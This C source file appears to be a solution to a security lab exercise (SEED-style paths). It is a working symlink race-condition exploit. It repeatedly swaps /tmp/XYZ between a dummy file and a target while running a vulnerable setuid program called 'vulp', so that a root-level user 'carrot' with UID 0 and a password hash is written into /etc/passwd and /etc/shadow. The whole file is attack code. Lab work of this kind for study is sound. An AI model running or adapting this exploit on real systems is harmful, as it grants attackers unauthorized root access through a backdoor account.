/* race.c  */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>

#define LINK "/tmp/XYZ"
#define DUMMY "/home/seed/Documents/ssof/lab2/dummy"

extern FILE *stdin;
extern FILE *stdout;

void race ( char *filename, char *carrot_name, char *carrot_string) {

	/* Declare variables */
	struct stat st;
	int inicial_size, final_size, counter = 1;
	FILE *carrot_file = NULL, *null_file = NULL;

	/* Add input to file */
	unlink( carrot_name );
	carrot_file = fopen( carrot_name, "w" ),
	fprintf(carrot_file, "%s", carrot_string);
	fclose(carrot_file);

	/* Get I/O descriptors */
	carrot_file = fopen( carrot_name, "r" );
	null_file   = fopen( "/dev/null", "w" );

	/* Get file inicial size */
	stat( filename, &st );
	inicial_size = st.st_size;

	while ( 1 ) {

		/* Prepare link */
		unlink( LINK );
		symlink( DUMMY, LINK );

		if( fork() == 0 ) {
			
			stdin  = carrot_file;
			stdout = null_file;
			execl( "./vulp", "vulp", NULL );
			exit( EXIT_SUCCESS );

		}

		/* Wait for program */
		/* usleep( 1 ); */

		/* Race-condition */
		unlink( LINK );
		symlink( filename, LINK );

		/* Print records */
		stat( filename, &st );
		final_size = st.st_size;
		if ( final_size > inicial_size ) {
			printf( "\nChanged %s\n", filename );
			return;
		}

		printf("\rAttempt: %d\r", counter++);

	}

}

int main ( int argc, char** argv ) {

	race( "/etc/passwd", "/tmp/race_passwd", "carrot:x:0:0:carrot:/root:/bin/bash" );
	race( "/etc/shadow", "/tmp/race_shadow", "carrot:$1$312$wvJjqn48qHEp.DhR./47R/:::::::" );

	/* End process successfully */
	exit( EXIT_SUCCESS );

}
